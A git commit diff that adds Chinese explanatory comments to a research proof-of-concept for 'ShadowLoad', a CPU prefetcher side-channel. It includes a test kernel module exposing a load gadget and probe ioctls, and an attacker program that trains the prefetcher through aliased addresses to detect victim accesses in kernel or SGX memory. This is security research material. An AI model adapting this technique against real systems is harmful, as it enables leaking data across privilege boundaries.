9b745cf29938b98aa7c810f04d22fd1d57784c2b
candyb0x <candyb0x@163.com>
2025-06-23 09:21:10 +0800

    注释添加

--- 01_shadowload/kernel_module/shadowload_module.c
+++ 01_shadowload/kernel_module/shadowload_module.c
@@ -10,177 +10,191 @@ MODULE_AUTHOR("Redacted");
 MODULE_DESCRIPTION("ShadowLoad PoC Kernel Module");
 MODULE_LICENSE("GPL");
 
-#define BUFFER_SIZE (PAGE_SIZE * 5)
+#define BUFFER_SIZE (PAGE_SIZE * 5) // 定义内核缓冲区的大小为 5 个页面
 
-static uint8_t* kernel_buffer;
+static uint8_t* kernel_buffer;  // 声明一个指向 uint8_t 类型的指针，将用于存储内核缓冲区。
 
+// 用户空间应用程序打开设备文件的处理函数
 static int device_open(struct inode *inode, struct file *file) {
   /* Lock module */
-  try_module_get(THIS_MODULE);
+  try_module_get(THIS_MODULE);  // 增加模块使用计数
   return 0;
 }
 
+// 用户空间应用程序关闭设备文件的处理函数
 static int device_release(struct inode *inode, struct file *file) {
   /* Unlock module */
-  module_put(THIS_MODULE);
+  module_put(THIS_MODULE);  // 减少模块使用计数
   return 0;
 }
-
-#if defined(__x86_64__)
-#define flush(x) asm volatile("clflush (%0)" :: "r" (x))
-#define maccess(x) asm volatile("mov (%0), %%rax" :: "r" (x) : "rax")
-#define mfence() asm volatile("mfence")
-#ifdef APERF 
+/* 架构相关代码 */
+#if defined(__x86_64__) // 如果是 x86-64 架构
+#define flush(x) asm volatile("clflush (%0)" :: "r" (x))  // x86 clflush 指令，用于刷新缓存行
+#define maccess(x) asm volatile("mov (%0), %%rax" :: "r" (x) : "rax") // x86 内存访问指令
+#define mfence() asm volatile("mfence") // x86 内存屏障
+#ifdef APERF // 如果定义了 APERF（一种性能计数器）
     static inline __attribute__((always_inline)) uint64_t _rdtsc(void) {
       uint64_t a, d;
       asm volatile("mfence");
-      asm volatile("rdpru" : "=a" (a), "=d" (d) : "c" (1));
+      asm volatile("rdpru" : "=a" (a), "=d" (d) : "c" (1)); // 读取 APERF 计数器（需要特定的 CPU 支持和权限）
       a = (d << 32) | a;
       asm volatile("mfence");
       return a;
     }
-#else // use rdtsc
+#else // 否则使用 rdtsc
 static inline __attribute__((always_inline)) uint64_t _rdtsc(void) {
     uint64_t a, d;
     mfence();
-    asm volatile("rdtsc" : "=a"(a), "=d"(d));
+    asm volatile("rdtsc" : "=a"(a), "=d"(d)); // 读取时间戳计数器
     a = (d << 32) | a;
     mfence();
     return a;
 }
 #endif /* APERF */
-#elif defined (__aarch64__)
-#define flush(x) asm volatile("DC CIVAC, %0" :: "r" (x))
-#define maccess(x) asm volatile("ldr x0, [%0]" :: "r" (x) : "x0")
-#define mfence() asm volatile("DSB SY\nISB")
+#elif defined (__aarch64__) // 如果是 ARM64 架构
+#define flush(x) asm volatile("DC CIVAC, %0" :: "r" (x))  // ARM DC CIVAC 指令，用于清除/刷新缓存（数据缓存，清理并作废）
+#define maccess(x) asm volatile("ldr x0, [%0]" :: "r" (x) : "x0") // ARM 内存访问指令（加载到 x0 寄存器）
+#define mfence() asm volatile("DSB SY\nISB")  // ARM 内存屏障（数据同步屏障和指令同步屏障）
 static inline __attribute__((always_inline)) uint64_t _rdtsc(void) {
     uint64_t a;
     mfence();
-    asm volatile("mrs %0, PMCCNTR_EL0" : "=r" (a));
+    asm volatile("mrs %0, PMCCNTR_EL0" : "=r" (a)); // 读取性能监控计数器（PMCCNTR_EL0）
     mfence();
     return a;
 }
 #endif /* ARCHITECTURE */
 
-// measure time of memory load
+// 测量内存加载所需的时间
 static inline __attribute__((always_inline)) uint64_t probe(void* addr){
     uint64_t start, end;
-    start = _rdtsc();
-    maccess(addr);
-    end = _rdtsc();
-    return end - start;
+    start = _rdtsc(); // 记录开始时间
+    maccess(addr);  // 访问内存地址
+    end = _rdtsc(); // 记录结束时间
+    return end - start; // 返回时间差
 }
 
+// 声明一个汇编函数 __gadget，它将在 ioctl 处理程序中定义
 void __gadget(uint64_t);
 
+// 这是 ioctl 设备的处理程序，允许用户空间应用程序与内核模块进行交互
 static long device_ioctl(struct file *file, unsigned int ioctl_num,
                          unsigned long ioctl_param) {
   size_t i;
   
-  switch(ioctl_num) {
+  switch(ioctl_num) { // 根据用户空间传递的 ioctl 命令编号进行分支
   
-  
+  // CMD_GADGET 命令的处理：执行一个内存加载操作
   case CMD_GADGET: {
-      #ifdef __x86_64__
+      #ifdef __x86_64__ // x86-64 架构的汇编指令
+      // 定义一个全局符号 __gadget，其后的汇编指令将加载 kernel_buffer 中 ioctl_param 偏移量处的内容。
       asm volatile(".global __gadget\n__gadget:\n mov (%0), %%rax" :: "r" (&kernel_buffer[ioctl_param]) : "rax");
-      #else // aarch64
+      #else // aarch64 架构的汇编指令
+      // 定义一个全局符号 __gadget，其后的汇编指令将加载 kernel_buffer 中 ioctl_param 偏移量处的内容。
       asm volatile(".global __gadget\n__gadget:\n ldr x0, [%0]" :: "r" (&kernel_buffer[ioctl_param]) : "x0");
       #endif /* ARCHITECTURE */
       break;
   }
-  
+  // CMD_FLUSH 命令的处理：刷新内核缓冲区
   case CMD_FLUSH: {
-      // flush buffer from cache
-      for(i = 0; i < BUFFER_SIZE; i += 64) {
+      // 遍历整个 kernel_buffer，并使用架构特定的 flush 宏将每个缓存行从缓存中清除。
+      for(i = 0; i < BUFFER_SIZE; i += 64) {  // 每次增加一个缓存行的大小
           flush(&kernel_buffer[i]);
       }
       break;
   }
-  
+  // CMD_INFO 命令的处理：提供内核地址信息给用户空间
   case CMD_INFO: {
       struct shadowload_kernel_info info;
-      info.kernel_buffer = (uintptr_t)kernel_buffer;
-      info.kernel_access = (uintptr_t)__gadget;
+      info.kernel_buffer = (uintptr_t)kernel_buffer;  // 存储 kernel_buffer 的虚拟地址
+      info.kernel_access = (uintptr_t)__gadget; // 存储 __gadget 汇编指令的虚拟地址
+      // 将 info 结构体的数据复制到用户空间（ioctl_param 指向的地址）
       copy_to_user((void*)ioctl_param, &info, sizeof(info));
       break;
   }
-  
+  // CMD_PROBE 命令的处理：测量内核缓冲区某个偏移量的访问时间
   case CMD_PROBE: {
+      // 从用户空间复制要探测的偏移量
       copy_from_user(&i, (void*)ioctl_param, sizeof(i));
+      // 在内核空间执行探测
       i = probe(&kernel_buffer[i]);
+      // 将探测结果复制回用户空间
       copy_to_user((void*)ioctl_param, &i, sizeof(i));
       break;
   }
   
-  default:
+  default:  // 未知的 ioctl 命令
     return -1;
   }
 
   return 0;
 }
 
+// 定义文件操作结构体，将上面定义的函数与设备文件操作关联起来
+static struct file_operations f_ops = {.unlocked_ioctl = device_ioctl,  // ioctl 命令处理函数
+                                       .open = device_open, // 打开设备文件处理函数
+                                       .release = device_release};  // 关闭设备文件处理函数
 
-static struct file_operations f_ops = {.unlocked_ioctl = device_ioctl,
-                                       .open = device_open,
-                                       .release = device_release};
-
+// 定义一个杂项设备结构体
 static struct miscdevice misc_dev = {
-    .minor = MISC_DYNAMIC_MINOR,
-    .name = SHADOWLOAD_MODULE_DEVICE_NAME,
-    .fops = &f_ops,
-    .mode = S_IRWXUGO,
+    .minor = MISC_DYNAMIC_MINOR,  // 动态分配次设备号
+    .name = SHADOWLOAD_MODULE_DEVICE_NAME,  // 设备名称
+    .fops = &f_ops, // 关联文件操作结构体
+    .mode = S_IRWXUGO,  // 设置设备文件的权限
 };
 
-#ifdef __aarch64__
+#ifdef __aarch64__  // ARM64 架构特有的 PMU（性能监控单元）配置
 
 // https://github.com/jerinjacobk/armv8_pmu_cycle_counter_el0/blob/master/armv8_pmu_el0_cycle_counter.c
+// 启用用户模式下对性能监控单元循环计数器的访问
 static void
 enable_cycle_counter_el0(void* data)
 {
 	u64 val;
 	/* Disable cycle counter overflow interrupt */
-	asm volatile("msr pmintenclr_el1, %0" : : "r" ((u64)(1 << 31)));
+	asm volatile("msr pmintenclr_el1, %0" : : "r" ((u64)(1 << 31)));  // 清除计数器溢出中断
 	/* Enable cycle counter */
-	asm volatile("msr pmcntenset_el0, %0" :: "r" BIT(31));
+	asm volatile("msr pmcntenset_el0, %0" :: "r" BIT(31));  // 启用 PMCCNTR_EL0 计数器
 	/* Enable user-mode access to cycle counters. */
-	asm volatile("msr pmuserenr_el0, %0" : : "r"(BIT(0) | BIT(2)));
+	asm volatile("msr pmuserenr_el0, %0" : : "r"(BIT(0) | BIT(2))); // 允许用户模式访问 PMCCNTR_EL0 和其他计数器
 	/* Clear cycle counter and start */
-	asm volatile("mrs %0, pmcr_el0" : "=r" (val));
-	val |= (BIT(0) | BIT(2));
-	isb();
-	asm volatile("msr pmcr_el0, %0" : : "r" (val));
+	asm volatile("mrs %0, pmcr_el0" : "=r" (val));  // 读取 PMCR_EL0 寄存器
+	val |= (BIT(0) | BIT(2)); // 设置 EN (Enable) 和 C (Cycle counter reset) 位
+	isb();  // 指令同步屏障
+	asm volatile("msr pmcr_el0, %0" : : "r" (val)); // 写回 PMCR_EL0 寄存器以启动计数器
 	val = BIT(27);
-	asm volatile("msr pmccfiltr_el0, %0" : : "r" (val));
+	asm volatile("msr pmccfiltr_el0, %0" : : "r" (val));  // 配置 PMCCNTR_EL0 的过滤器（这里可能设置为计数所有指令）
 }
 
+// 禁用用户模式下对性能监控单元循环计数器的访问
 static void
 disable_cycle_counter_el0(void* data)
 {
 	/* Disable cycle counter */
-	asm volatile("msr pmcntenset_el0, %0" :: "r" (0 << 31));
+	asm volatile("msr pmcntenset_el0, %0" :: "r" (0 << 31));  // 禁用 PMCCNTR_EL0
 	/* Disable user-mode access to counters. */
-	asm volatile("msr pmuserenr_el0, %0" : : "r"((u64)0));
+	asm volatile("msr pmuserenr_el0, %0" : : "r"((u64)0));  // 禁用用户模式访问计数器
 
 }
 
 #endif /* __aarch64__ */
 
+// 模块初始化函数，当模块被加载时执行
 int init_module(void) {
   int r;
   
-  #ifdef __aarch64__
+  #ifdef __aarch64__  // 如果是 ARM64 架构，为每个 CPU 核心启用循环计数器
   on_each_cpu(enable_cycle_counter_el0, NULL, 1);
   #endif /* __aarch64__ */
   
   /* Register device */
-  r = misc_register(&misc_dev);
-  if (r != 0) {
+  r = misc_register(&misc_dev); // 注册杂项设备
+  if (r != 0) { // 如果注册失败
     printk(KERN_ALERT "[shadowload-poc] Failed registering device with %d\n", r);
-    return 1;
+    return 1; // 返回非零表示失败
   }
 
-  kernel_buffer = kmalloc(BUFFER_SIZE, GFP_KERNEL);
-  
+  kernel_buffer = kmalloc(BUFFER_SIZE, GFP_KERNEL); // 分配内核缓冲区内存
+  // 打印内核缓冲区和 gadget 的地址，这些地址将传递给用户空间程序
   printk(KERN_INFO "[shadowload-poc] buffer address: 0x%016llx\n", (uint64_t)kernel_buffer);
   printk(KERN_INFO "[shadowload-poc] gadget address: 0x%016llx\n", (uint64_t)__gadget);
 
@@ -189,14 +203,14 @@ int init_module(void) {
 
 void cleanup_module(void) {
   
-  #ifdef __aarch64__
+  #ifdef __aarch64__  // 如果是 ARM64 架构，为每个 CPU 核心禁用循环计数器
   on_each_cpu(disable_cycle_counter_el0, NULL, 1);
   #endif /* __aarch64__ */
 
-  misc_deregister(&misc_dev);
+  misc_deregister(&misc_dev); // 注销杂项设备
   
-  kfree(kernel_buffer);
+  kfree(kernel_buffer); // 释放内核缓冲区内存
   
-  printk(KERN_INFO "[shadowload-poc] Removed.\n");
+  printk(KERN_INFO "[shadowload-poc] Removed.\n");  // 打印模块卸载信息
 }
 
--- 01_shadowload/shadowload.c
+++ 01_shadowload/shadowload.c
@@ -4,53 +4,54 @@
 #include <stdlib.h>
 #include <sys/mman.h>
 
+// 声明外部汇编函数：加载 gadget 的开始和结束
 void load_gadget_start(void* address);
 void load_gadget_end(void);
 
-#define PAGE_SIZE 4096
-#define CACHE_LINE_SIZE 64
+#define PAGE_SIZE 4096      // 定义页大小为 4KB
+#define CACHE_LINE_SIZE 64  // 定义缓存行大小为 64 字节
 
-/* architecture dependent code */
-#if defined(__x86_64__)
-#define maccess(x) asm volatile("mov (%0), %%rax" :: "r" (x) : "rax")
-#define nop() asm volatile("nop")
-#define mfence() asm volatile("mfence")
-#define flush(x) asm volatile("clflush (%0)" :: "r" (x));
-#ifdef APERF 
+/* 架构相关代码 */
+#if defined(__x86_64__) // 如果是 x86-64 架构
+#define maccess(x) asm volatile("mov (%0), %%rax" :: "r" (x) : "rax")   // 内存访问宏：将地址 x 的内容加载到 rax 寄存器。
+#define nop() asm volatile("nop")   // 空操作宏
+#define mfence() asm volatile("mfence") // 内存屏障宏
+#define flush(x) asm volatile("clflush (%0)" :: "r" (x));   // 缓存行刷新宏
+#ifdef APERF   // 如果定义了 APERF（一种性能计数器）
     static inline __attribute__((always_inline)) uint64_t _rdtsc(void) {
       uint64_t a, d;
-      asm volatile("mfence");
-      asm volatile("rdpru" : "=a" (a), "=d" (d) : "c" (1));
-      a = (d << 32) | a;
-      asm volatile("mfence");
+      asm volatile("mfence");   // 内存屏障
+      asm volatile("rdpru" : "=a" (a), "=d" (d) : "c" (1)); // 读取 APERF 寄存器（需要特定的 CPU 支持和权限）
+      a = (d << 32) | a;    // 组合 64 位值
+      asm volatile("mfence");   // 内存屏障
       return a;
     }
-#else // use rdtsc
+#else // 否则使用 rdtsc
 static inline __attribute__((always_inline)) uint64_t _rdtsc(void) {
     uint64_t a, d;
-    mfence();
-    asm volatile("rdtsc" : "=a"(a), "=d"(d));
-    a = (d << 32) | a;
-    mfence();
+    mfence();   // 内存屏障
+    asm volatile("rdtsc" : "=a"(a), "=d"(d));   // 读取时间戳计数器
+    a = (d << 32) | a;  // 组合 64 位值
+    mfence();   // 内存屏障
     return a;
 }
-#endif /* APERF */
-#elif defined (__aarch64__)
-#define maccess(x) asm volatile("ldr x0, [%0]" :: "r" (x) : "x0")
-#define nop() asm volatile("nop")
-#define mfence() asm volatile("DSB SY\nISB")
+#endif /* APERF */ 
+#elif defined (__aarch64__) // 如果是 ARM64 架构
+#define maccess(x) asm volatile("ldr x0, [%0]" :: "r" (x) : "x0")   // 内存访问宏：加载到 x0 寄存器
+#define nop() asm volatile("nop")   // 空操作宏
+#define mfence() asm volatile("DSB SY\nISB")    // ARM 内存屏障（数据同步屏障和指令同步屏障）
 static inline __attribute__((always_inline)) uint64_t _rdtsc(void) {
     uint64_t a;
-    mfence();
-    asm volatile("mrs %0, PMCCNTR_EL0" : "=r" (a));
-    mfence();
+    mfence();   // 内存屏障
+    asm volatile("mrs %0, PMCCNTR_EL0" : "=r" (a));   // 读取性能监控计数器（PMCCNTR_EL0）
+    mfence();   // 内存屏障
     return a;
 }
-static uint8_t evict_buffer[PAGE_SIZE * 1000];
+static uint8_t evict_buffer[PAGE_SIZE * 1000];  // ARM 架构下用于驱逐缓存的缓冲区
 
 #endif /* ARCHITECTURE */
 
-#define VICTIM_BUFFER_SIZE (PAGE_SIZE * 5)
+#define VICTIM_BUFFER_SIZE (PAGE_SIZE * 5)  // 定义受害者缓冲区大小为 5 个页面
 
 // measure time of memory load
 static inline __attribute__((always_inline)) uint64_t probe(void* addr){
@@ -61,25 +62,26 @@ static inline __attribute__((always_inline)) uint64_t probe(void* addr){
     return end - start;
 }
     
-// buffer that collides with victim buffer
+// 冲突缓冲区：与受害者缓冲区共享相同的缓存集
 uint8_t* colliding_buffer;
     
-// load instruction that collides with load gadget in victim
+// 冲突加载指令：将用于触发预取器
 void (*colliding_load)(void*);
 
-#ifdef KERNEL_MODULE
+#ifdef KERNEL_MODULE    // 如果针对内核模块进行攻击
 
 #include <fcntl.h>
 #include <sys/ioctl.h>
-#include "kernel_module/shadowload_module.h"
+#include "kernel_module/shadowload_module.h"    // 内核模块头文件
 
-int module_fd;
+int module_fd;  // 内核模块的文件描述符
 
+// 刷新受害者缓冲区（通过 ioctl 调用内核模块刷新）
 static void flush_victim_buffer(void) {
-    ioctl(module_fd, CMD_FLUSH, 0);
+    ioctl(module_fd, CMD_FLUSH, 0); // 通知内核模块刷新其缓冲区
     
     #if defined (__x86_64__)
-    #ifdef FLUSH_COLLIDING
+    #ifdef FLUSH_COLLIDING  // 如果定义了 FLUSH_COLLIDING，则也刷新用户空间的冲突缓冲区
     for(uint64_t offset = 0; offset < VICTIM_BUFFER_SIZE; offset += CACHE_LINE_SIZE) {
         flush(&colliding_buffer[offset]);
     }
@@ -87,113 +89,131 @@ static void flush_victim_buffer(void) {
     #endif /* __x86_64__ */
 }
 
+// 探测受害者缓冲区（通过 ioctl 调用内核模块探测）
 static uint64_t probe_victim_buffer(uint64_t offset) {
     uint64_t io = offset;
-    ioctl(module_fd, CMD_PROBE, &io);
-    return io;
+    ioctl(module_fd, CMD_PROBE, &io);   // 通知内核模块探测指定偏移量，并将结果写回 io
+    return io;  // 返回探测时间
 }
 
+// 调用受害者的加载小工具（通过 ioctl 调用内核模块执行加载）
 static void load_gadget(uint64_t offset) {
-    ioctl(module_fd, CMD_GADGET, offset);
+    ioctl(module_fd, CMD_GADGET, offset);   
 }
 
-#elif defined (SGX)
+#elif defined (SGX) // 如果针对 SGX enclave 进行攻击
 
-#include "sgx_enclave/sgx_victim.h"
+#include "sgx_enclave/sgx_victim.h" // SGX 受害者 enclave 的头文件
 
+// 映射 SGX enclave 内部的函数到外部 C 函数
 #define flush_victim_buffer sgx_flush_victim_buffer
 #define probe_victim_buffer sgx_probe_victim_buffer
-#define load_gadget sgx_load_gadget
+#define load_gadget sgx_load_gadget 
 
-#else
+#else   // 否则在用户空间模拟受害者
 
-static uint8_t* victim_buffer;
+static uint8_t* victim_buffer;  // 用户空间受害者缓冲区
 
+// 刷新受害者缓冲区（在用户空间直接刷新）
 static void flush_victim_buffer(void) {
     #if defined (__aarch64__)
+    // 在 ARM64 上，用户空间没有统一的 clflush，所以使用驱逐（eviction）而不是直接刷新
     // no flushing available across all arm devices in userspace. Just use eviction
-    for(int i = 0; i < 3; i++) {
+    for(int i = 0; i < 3; i++) {    // 多次循环以确保驱逐
         for(uint64_t offset = 0; offset < sizeof(evict_buffer); offset += 64) {
-            maccess(&evict_buffer[offset]);
+            maccess(&evict_buffer[offset]); // 访问大缓冲区以驱逐其他缓存行
         }
     }
     
     #else // x86_64
     for(uint64_t offset = 0; offset < VICTIM_BUFFER_SIZE; offset += CACHE_LINE_SIZE) {
-        flush(&victim_buffer[offset]);
-        #ifdef FLUSH_COLLIDING
+        flush(&victim_buffer[offset]);  // 使用 clflush 刷新受害者缓冲区
+        #ifdef FLUSH_COLLIDING  // 如果也需要刷新冲突缓冲区
         flush(&colliding_buffer[offset]);
         #endif /* FLUSH_COLLIDING */
     }
     #endif /* __aarch64__ */
 }
 
+// 探测受害者缓冲区（在用户空间直接探测）
 static uint64_t probe_victim_buffer(uint64_t offset) {
-    return probe(&victim_buffer[offset]);
+    return probe(&victim_buffer[offset]);   // 调用本地 probe 函数
 }
 
+// 调用受害者的加载小工具（在用户空间直接调用汇编函数）
 static void load_gadget(uint64_t offset) {
-    load_gadget_start(&victim_buffer[offset]);
+    load_gadget_start(&victim_buffer[offset]);  // 调用汇编中定义的 load_gadget_start
 }
 
 #endif /* KERNEL_MODULE */
 
+// 比较 int64_t 类型的函数，用于 qsort
 static int compare_int64(const void * a, const void * b) {
     return *(int64_t*)a - *(int64_t*)b;
 }
 
+// 计算缓存命中/未命中的时间阈值
 static uint64_t calculate_threshold(){
     uint64_t vals[100];
-    for(uint32_t i = 0; i < 1000000000; ++i) nop();
+    for(uint32_t i = 0; i < 1000000000; ++i) nop(); // 大量空操作以稳定 CPU 状态
     for(uint32_t i = 0; i < 100; i++){
-        vals[i] = probe(&vals[50]);
-        mfence();
+        vals[i] = probe(&vals[50]); // 探测一个在缓存中的地址（自我探测）
+        mfence();   // 内存屏障
     }
-    qsort(vals, 100, sizeof(uint64_t), compare_int64); 
-    return vals[90] + 40;
+    qsort(vals, 100, sizeof(uint64_t), compare_int64);  // 对探测结果排序
+    return vals[90] + 40;   // 返回第 90 个百分位的探测时间加上一个偏移量作为阈值
 }
 
+// ShadowLoad 攻击的核心函数
 static uint64_t shadowload(uint64_t stride, int accesses, int aligned) {
-     
+    // 计算受害者缓冲区中的目标偏移量。
+    // 如果 aligned 为真，表示模式对齐到 stride，受害者会访问 accesses * stride 处。
+    // 如果 aligned 为假，受害者访问 0 处。
     uint64_t victim_offset = aligned ? accesses * stride : 0;
     
-    flush_victim_buffer();
+    flush_victim_buffer();  // 刷新受害者缓冲区，确保目标数据不在缓存中
     
-    // this is required. Not 100% sure why, but without nopping, there is no prefetching
+    // 这很关键。如果没有这些 nop 操作，预取器可能不会被触发。
+    // 这些 nop 操作可能提供一个时间窗口，让预取器处理前面的访问模式。
     for(int i = 0; i < 10000000; i++) nop();
     
     // repeating 5 times is not necessary, but there is no reason not to (and it may increase chance of success)
+    // 重复 5 次以增加攻击成功率
     for(int repeat = 0; repeat < 5; repeat ++) {
-        
-        for(int access = 0; access < accesses; access++) {
-            colliding_load(&colliding_buffer[access * stride]);
-            mfence();
+        // 攻击者连续访问 colliding_buffer 中的地址，形成一个模式：stride, 2*stride, 3*stride...
+        // 这一步旨在“训练”或“提示”CPU 的预取器。
+        for(int access = 0; access < accesses; access++) {  // 进行accesses次训练
+            colliding_load(&colliding_buffer[access * stride]); // 使用冲突加载指令访问
+            mfence();   // 内存屏障
         }
-        
-        load_gadget(victim_offset);    
+        // 此时，如果预取器被训练成功，它可能会预测攻击者接下来会访问 colliding_buffer 的某个地址。
+        // 由于 colliding_buffer 与 victim_buffer 物理地址别名，预取器可能会错误地预取 victim_buffer 中的数据。
+        load_gadget(victim_offset); // 调用受害者的加载小工具，受害者会访问 victim_offset 处的内存
         mfence();
     }
-    
+    // 探测 victim_offset + stride 处的内存访问时间。
+    // 如果预取器成功被欺骗并预取了 victim_buffer 的相应部分，那么这次探测会非常快（缓存命中）。
+    // 这表明预取器“识别”了攻击者在 colliding_buffer 上的模式，并将其错误地应用到了 victim_buffer 上。
     return probe_victim_buffer(victim_offset + stride);
 }
 
 
 int main(int argc, char** argv) {
     
-    // get processor into steady state
+    // 让处理器进入稳定状态
     for(int i = 0; i < 100000000; i++) nop();
     
-    // address of load that collides with victim load
+    // 冲突加载指令的地址
     uintptr_t colliding_load_address;
     
-    // address of buffer that collides with victim buffer
+    // 冲突缓冲区的地址
     uintptr_t colliding_buffer_address;
     
-    // threshold to distinquish cache hits from misses
+    // 缓存命中/未命中的阈值
     uint64_t threshold = calculate_threshold();
     
     
-    #ifdef KERNEL_MODULE
+    #ifdef KERNEL_MODULE    // 针对内核模块的特定初始化
     
     struct shadowload_kernel_info info;
     
@@ -204,34 +224,40 @@ int main(int argc, char** argv) {
         return -1;
     }
     
-    // get required information for kernel
+    // 从内核模块获取所需信息
     ioctl(module_fd, CMD_INFO, &info);
-    
+    // 获取内核模块提供的内核加载指令和缓冲区地址。
+    // & 0x7fffffffffffull 可能用于清除高位，将其限制在典型的用户空间可访问地址范围或规范化地址。
     colliding_load_address = info.kernel_access & 0x7fffffffffffull;
     colliding_buffer_address  = info.kernel_buffer & 0x7fffffffffffull;
     
-    #elif defined (SGX)
+    #elif defined (SGX) // 针对 SGX enclave 的特定初始化
     
-    threshold = 150;
+    threshold = 150;    // SGX 环境下可能需要不同的阈值
 
-    if(sgx_start()){
+    if(sgx_start()){    // 启动 SGX enclave
         fputs("failed to start SGX victim!\n", stderr);
         return -1;
     }
     
+    // 从 SGX enclave 获取信息。
+    // 地址通过异或操作进行混淆，需要反转异或来获得正确的地址。
     sgx_get_info((void**)(void*)&colliding_load_address, (void**)(void*)&colliding_buffer_address);
-    colliding_load_address ^= 1ull << 46ull;
-    colliding_buffer_address ^= 1ull << 46ull;
+    colliding_load_address ^= 1ull << 46ull;    // 反转第 46 位以获取真实地址
+    colliding_buffer_address ^= 1ull << 46ull;  // 反转第 46 位以获取真实地址
     
-    #else
+    #else   // 在用户空间模拟受害者（默认情况）
     
     // map buffer in userspace (at any arbitrary address)
+    // 在用户空间映射受害者缓冲区
     victim_buffer = mmap(NULL, VICTIM_BUFFER_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
     if(victim_buffer == MAP_FAILED){
         fputs("unable to allocate buffer!", stderr);
         return -1;
     }
-    
+
+    // 冲突缓冲区地址和冲突加载指令地址通过翻转受害者缓冲区和 gadget 地址的第 46 位来生成。
+    // 这是一种常见的技巧，用于在虚拟地址空间中创建物理地址别名，因为在某些系统上，高位虚拟地址的差异可能映射到相同的低位物理地址。
     // colliding buffer address is address of buffer but bit 46 flipped
     colliding_buffer_address = (uintptr_t)victim_buffer ^ (1ull << 46ull);
     
@@ -240,38 +266,43 @@ int main(int argc, char** argv) {
     
     #endif /* KERNEL_MODULE */
     
-    // map colliding memory buffer
+    // 映射冲突内存缓冲区
     colliding_buffer = mmap((void*) colliding_buffer_address, VICTIM_BUFFER_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_FIXED_NOREPLACE, -1, 0);
     if(colliding_buffer == MAP_FAILED) {
         fprintf(stderr, "failed to map colliding memory buffer to 0x%016zx\n", colliding_buffer_address);
         return -1;
     }
     
-    // map colliding memory access instruction
+    // 映射冲突内存访问指令（load_gadget_start）
+    // 映射包含 load_gadget_start 的页，并使其可执行。
     uint8_t* code_buf = mmap((void*)(colliding_load_address & 0x7ffffffff000ull), PAGE_SIZE * 2, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_FIXED_NOREPLACE, -1, 0);
     if(code_buf == MAP_FAILED) {
         fprintf(stderr, "unable to allocate colliding memory load to 0x%016zx\n", (uint64_t)(colliding_load_address & 0x7ffffffff000ull));
         return -1;
     }
+    // 将 load_gadget_start 的汇编代码复制到映射的可执行内存中。
     memcpy(code_buf + (colliding_load_address & 0xfff), load_gadget_start, (uint8_t*)load_gadget_end - (uint8_t*)load_gadget_start);
-    mprotect(code_buf, PAGE_SIZE * 2, PROT_READ | PROT_EXEC);
+    mprotect(code_buf, PAGE_SIZE * 2, PROT_READ | PROT_EXEC);   // 设置为可执行
+    // 将 colliding_load 函数指针指向复制的 gadget 代码。
     colliding_load = (void*)(code_buf + (colliding_load_address & 0xfff));
     
 //    printf("colliding buffer: %p\ncolliding load: %p\n", colliding_buffer, colliding_load);
-
-    for(int accesses = 1; accesses <= 8; accesses ++) {
-        for(uint64_t stride = 64; stride <= 2048; stride += 64) {
-            for(int aligned = 0; aligned <= 1; aligned ++) {
+    // 进行 ShadowLoad 攻击的实验循环
+    for(int accesses = 1; accesses <= 8; accesses ++) { // 不同的访问次数（训练预取器的次数）
+        for(uint64_t stride = 64; stride <= 2048; stride += 64) {   // 不同的步长
+            for(int aligned = 0; aligned <= 1; aligned ++) {    // 对齐或不对齐模式
                 int hits = 0;
-                for(int repeat = 0; repeat < 100; repeat ++) {
+                for(int repeat = 0; repeat < 100; repeat ++) {  // 重复 100 次以收集统计数据
+                    // 调用 shadowload 函数执行一次攻击，如果探测时间低于阈值，则视为命中（预取成功）。
                     hits += shadowload(stride, accesses, aligned) < threshold;
                 }
+                // 打印结果：访问次数，步长，是否对齐，命中次数
                 printf("%d %zu %d %d\n", accesses, stride, aligned, hits);
             }
         }
     }
     
-    #ifdef SGX
+    #ifdef SGX  // 如果是 SGX 模式，停止 enclave
     sgx_stop();
     #endif /* SGX */
     
